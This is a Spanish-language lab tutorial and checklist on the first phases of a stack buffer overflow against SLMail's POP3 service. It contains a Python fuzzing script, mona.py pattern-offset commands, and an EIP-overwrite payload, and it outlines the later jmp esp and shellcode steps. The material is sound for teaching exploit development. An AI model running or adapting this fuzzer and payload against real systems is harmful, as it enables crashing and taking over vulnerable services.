
---
# Checklist — Fases iniciales de un Buffer Overflow

- [ ] Identificar los límites del programa objetivo introduciendo más caracteres de los permitidos en los campos de entrada (como cadenas o archivos).
- [ ] Detectar cuándo se produce una corrupción o fallo en la aplicación al superar esos límites.
- [ ] Determinar el offset exacto: la cantidad precisa de caracteres necesarios para sobrescribir el contenido del registro EIP.
- [ ] Confirmar que el registro EIP puede ser sobrescrito con un valor controlado por nosotros.
- [ ] Diseñar un exploit personalizado para el programa objetivo que permita tomar control del registro EIP y ejecutar código malicioso.

---
# Fase inicial — Fuzzing y control del registro EIP

En esta etapa vamos a descubrir **cuándo** y **dónde** se rompe el servicio vulnerable y cómo asegurarnos de que, llegado el momento, el registro **EIP** quede bajo nuestro control.

---

## 1. Objetivo de la fase de fuzzing

1. **Detectar el punto de fallo**  
   Enviamos cadenas cada vez más largas hasta provocar la caída del proceso.  
2. **Calcular el offset exacto**  
   Averiguamos cuántos bytes necesita la cadena para que los cuatro del registro EIP sean sobrescritos por datos que enviamos nosotros.

---

## 2. Fuzzing incremental

Empezamos con un script sencillo que:

1. Abre conexión contra el servicio POP3 de **SLMail** (puerto 110).  
2. Envía la secuencia `USER <payload>\r\n`.  
3. Incrementa el tamaño del _payload_ en bloques de 100 bytes.  
4. Registra en qué longitud el servicio deja de responder.

> **Consejo:** hacemos que el script se detenga 5 segundos tras cada envío para dar tiempo a que SLMail crashee y a Immunity Debugger a registrar el fallo.

```python
#!/usr/bin/env python3
import socket, time, sys

ip   = "192.168.56.101"   # VM con Windows 7 + SLMail
port = 110
step = 100
limit = 3000              # máxima longitud a probar

for size in range(step, limit + step, step):
    try:
        s = socket.create_connection((ip, port), timeout=10)
        banner = s.recv(1024)
        print(f"[+] Enviando {size} bytes")
        s.sendall(b"USER " + b"A" * size + b"\r\n")
        time.sleep(1)
        s.close()
    except:
        print(f"[!] Crash detectado a ~{size} bytes")
        sys.exit(0)
````

### Resultado esperado

En Immunity veremos un **Access Violation** cuando `SLMail.exe` intenta acceder a memoria inválida. Anotamos el tamaño en el que ocurre.

---

## 3. Generar un patrón único

Ahora sustituimos la ristra de “A” por un patrón que no repite secuencias (de Corelan / Metasploit). Con **mona.py**:

```bash
!mona pattern_create 3000
```

Copiamos la cadena generada y la insertamos en nuestro script (solo una vez, nada de incrementos). Al provocar el crash otra vez, Immunity mostrará un valor como:

```
EIP  39684338
```

---

## 4. Calcular el offset exacto

En la ventana de comandos de Immunity:

```bash
!mona pattern_offset 0x39684338
```

Mona devuelve, por ejemplo:

```
[+] Offset found at 2606
```

Eso significa que **exactamente 2 606 bytes** llegan a EIP; los 4 siguientes lo sobreescriben.

---

## 5. Verificar que controlamos EIP

Creamos otra prueba:

1. **2 606 bytes** de relleno (p. ej. `"A"`),
    
2. **4 bytes** conocidos (por comodidad `"B"*4` = `0x42424242`),
    
3. Resto de la cadena (por ahora basura).
    

```python
payload = b"A" * 2606 + b"B" * 4 + b"C" * 500
```

Tras ejecutar el script, Immunity debería mostrar:

```
EIP  42424242
```

¡Objetivo cumplido! Hemos demostrado que podemos colocar el valor que queramos en el registro EIP y, por tanto, redirigir el flujo del programa.

---

## 6. Próximos pasos

1. **Localizar un “jmp esp”** o instrucción equivalente en un módulo sin protecciones (sin ASLR, sin DEP, RWX).
    
2. Sustituir los cuatro “B” por la dirección de esa instrucción escrita en **little-endian**.
    
3. Construir el _shellcode_ y colocarle un **NOP-sled** antes para asegurar la ejecución.
    

---


